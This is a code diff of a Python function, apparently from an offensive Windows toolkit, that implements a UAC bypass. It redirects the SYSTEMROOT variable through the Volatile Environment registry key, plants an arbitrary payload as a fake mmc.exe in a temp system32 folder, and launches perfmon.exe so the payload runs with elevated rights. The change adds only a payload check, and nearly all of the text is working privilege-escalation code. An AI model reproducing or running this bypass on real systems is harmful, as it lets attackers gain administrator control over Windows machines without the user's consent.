@@ -18,68 +18,72 @@ perfmon_info = {
 		}
 
 def perfmon(payload):
-	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))					
-		_winreg.SetValueEx(key,"SYSTEMROOT",0,_winreg.REG_SZ,tempfile.gettempdir())
-		_winreg.CloseKey(key)
-	except Exception as error:
-		print_error("Unable to create registry keys, exception was raised: {}".format(error))
-		return False
-	else:
-		print_success("Successfully created SYSTEMROOT key containing a new temp directory ({})".format(os.path.join(tempfile.gettempdir())))
+	if (payloads().exe(payload) == True):
+		try:
+			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))					
+			_winreg.SetValueEx(key,"SYSTEMROOT",0,_winreg.REG_SZ,tempfile.gettempdir())
+			_winreg.CloseKey(key)
+		except Exception as error:
+			print_error("Unable to create registry keys, exception was raised: {}".format(error))
+			return False
+		else:
+			print_success("Successfully created SYSTEMROOT key containing a new temp directory ({})".format(os.path.join(tempfile.gettempdir())))
 
-	try:
-		if ((os.path.exists(os.path.join(tempfile.gettempdir(),"system32"))) == True):
-			if ((os.path.isfile(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))) == True):
-				try:
-					os.remove(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
-				except Exception as error:
-					return False
-				try:
-					os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
-				except Exception as error:
-					return False
+		try:
+			if ((os.path.exists(os.path.join(tempfile.gettempdir(),"system32"))) == True):
+				if ((os.path.isfile(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))) == True):
+					try:
+						os.remove(os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
+					except Exception as error:
+						return False
+					try:
+						os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
+					except Exception as error:
+						return False
+				else:
+					try:
+						os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
+					except Exception as error:
+						return False
 			else:
-				try:
-					os.rmdir(os.path.join(tempfile.gettempdir(),"system32"))
-				except Exception as error:
-					return False
+				pass
+		except Exception as error:
+			return False
+
+		try:
+			os.makedirs(os.path.join(tempfile.gettempdir(),"system32"))
+		except Exception as error:
+			return False
+
+		time.sleep(5)
+
+		try:
+			shutil.copy(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
+		except shutil.Error as error:
+			return False
+		except IOError as error:
+			return False
+
+		time.sleep(5)
+
+		print_info("Disabling file system redirection")
+		with disable_fsr():
+			print_success("Successfully disabled file system redirection")
+			if (os.system("perfmon.exe") == 0):
+				print_success("Successfully spawned process ({})".format(payload))
+			else:
+				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
+		
+		time.sleep(5)
+		
+		try:
+			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))
+			_winreg.DeleteValue(key,"SYSTEMROOT")
+		except Exception as error:
+			print_error("Unable to cleanup")
+			return False
 		else:
-			pass
-	except Exception as error:
-		return False
-
-	try:
-		os.makedirs(os.path.join(tempfile.gettempdir(),"system32"))
-	except Exception as error:
-		return False
-
-	time.sleep(5)
-
-	try:
-		shutil.copy(payload,os.path.join(tempfile.gettempdir(),"system32\mmc.exe"))
-	except shutil.Error as error:
-		return False
-	except IOError as error:
-		return False
-
-	time.sleep(5)
-
-	print_info("Disabling file system redirection")
-	with disable_fsr():
-		print_success("Successfully disabled file system redirection")
-		if (os.system("perfmon.exe") == 0):
-			print_success("Successfully spawned process ({})".format(payload))
-		else:
-			print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-	
-	time.sleep(5)
-	
-	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))
-		_winreg.DeleteValue(key,"SYSTEMROOT")
-	except Exception as error:
-		print_error("Unable to cleanup")
-		return False
+			print_success("Successfully cleaned up, enjoy!")
 	else:
-		print_success("Successfully cleaned up, enjoy!")
+		print_error("Cannot proceed, invalid payload")
+		return False					
